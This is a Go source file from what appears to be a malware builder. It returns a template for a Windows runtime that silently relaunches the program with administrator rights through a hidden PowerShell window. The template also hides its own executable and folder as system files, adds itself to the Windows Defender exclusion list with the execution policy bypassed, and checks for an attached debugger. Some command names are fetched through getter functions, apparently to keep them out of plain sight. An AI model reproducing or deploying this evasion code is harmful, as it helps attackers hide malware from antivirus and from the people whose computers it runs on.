package buildergen

import "strings"

func templateRuntime() string {
	return strings.TrimSpace(`
func relaunchAsAdmin() {
	if runtime.GOOS != "windows" {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	escaped := strings.ReplaceAll(exePath, "'", "''")
	psCmd := getPsStartProcessPrefix() + escaped + getPsRunasSuffix()
	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psCmd)
	_ = cmd.Start()
}

func hideSelfFiles() {
	if !hideFilesEnabled {
		return
	}

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	attr := uint32(windows.FILE_ATTRIBUTE_HIDDEN | windows.FILE_ATTRIBUTE_SYSTEM)
	_ = windows.SetFileAttributes(windows.StringToUTF16Ptr(exePath), attr)

	dirPath := filepath.Dir(exePath)
	_ = windows.SetFileAttributes(windows.StringToUTF16Ptr(dirPath), attr)
}

func addSelfToExclusions(path string) {
	if runtime.GOOS != "windows" {
		return
	}
	if strings.TrimSpace(path) == "" {
		return
	}
	psCmd := fmt.Sprintf("%s '%s'", getAddMpPreferenceCmd(), strings.ReplaceAll(path, "'", "''"))
	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", psCmd)
	_ = cmd.Start()
}

func isDebuggerPresent() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	procIsDebuggerPresent := kernel32.NewProc(getIsDebuggerPresentName())
	ret, _, _ := procIsDebuggerPresent.Call()
	return ret != 0
}
`)
}